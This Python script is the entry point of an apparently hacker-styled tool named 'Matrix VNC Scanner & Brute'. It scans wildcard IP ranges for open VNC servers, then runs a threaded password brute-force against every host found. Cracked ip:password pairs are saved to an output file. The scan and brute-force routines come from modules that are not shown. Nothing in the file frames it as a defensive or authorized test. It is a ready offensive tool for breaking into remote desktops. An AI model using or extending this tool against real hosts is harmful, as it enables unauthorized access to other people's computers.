import argparse
from config import DEFAULT_CONFIG, ensure_dirs
from matrix_ui import matrix_banner, matrix_stream
from utils import ip_range_from_wildcard
from scan import scan_range
from brute import brute_force
import os
from rich.console import Console
from rich.panel import Panel
import shutil

def load_passwords_from_file(path):
    if os.path.exists(path):
        with open(path) as f:
            return [line.strip() for line in f if line.strip()]
    return []

def print_scan_header(ip_range, port, threads, total):
    console = Console()
    panel = Panel.fit(
        f"[magenta]SCANNING IP RANGE[/magenta]\n"
        f"[cyan]{ip_range}[/cyan]\n\n"
        f"[magenta]PORT:[/magenta] [cyan]{port}[/cyan]    [magenta]THREADS:[/magenta] [cyan]{threads}[/cyan]\n"
        f"[magenta]TOTAL IPs:[/magenta] [cyan]{total}[/cyan]",
        title="[bold cyan]VNC SCANNER HUNTER[/bold cyan]",
        border_style="bright_cyan"
    )
    console.print(panel, justify=None)

def main():
    parser = argparse.ArgumentParser(description="Matrix VNC Scanner & Brute")
    parser.add_argument("--scan", action="store_true", help="Scan for VNC servers")
    parser.add_argument("--brute", action="store_true", help="Brute-force VNC servers")
    parser.add_argument("--range", type=str, default=DEFAULT_CONFIG["scan_range"], help="IP range (wildcard, e.g. 192.168.1.*)")
    parser.add_argument("--port", type=int, default=DEFAULT_CONFIG["scan_port"], help="VNC port")
    parser.add_argument("--threads", type=int, default=DEFAULT_CONFIG["scan_threads"], help="Threads for scanning")
    parser.add_argument("--passwords", type=str, nargs="*", default=None, help="Passwords for brute-force")
    args = parser.parse_args()

    ensure_dirs()
    matrix_banner()
    matrix_stream()

    if args.scan:
        ip_list = ip_range_from_wildcard(args.range)
        print_scan_header(args.range, args.port, args.threads, len(ip_list))
        found = scan_range(ip_list, args.port, DEFAULT_CONFIG["scan_timeout"], args.threads)
        with open("output/ips.txt", "a") as f:
            for ip in found:
                f.write(ip + "\n")
        print(f"Found {len(found)} VNC servers. Results saved in output/ips.txt")

    if args.brute:
        print("Brute-forcing...")
        with open("output/ips.txt") as f:
            ips = [line.strip() for line in f if line.strip()]
        # Prioritate: CLI > fisier > config
        if args.passwords:
            passwords = args.passwords
        else:
            passwords = load_passwords_from_file("input/passwords.txt") or DEFAULT_CONFIG["passwords"]
        results = brute_force(ips, args.port, passwords, DEFAULT_CONFIG["brute_timeout"], DEFAULT_CONFIG["brute_threads"])
        with open("output/results.txt", "w") as f:
            for ip, pwd in results:
                f.write(f"{ip}:{pwd}\n")
        print(f"Brute-force complete. Successes saved in output/results.txt")

if __name__ == "__main__":
    main() 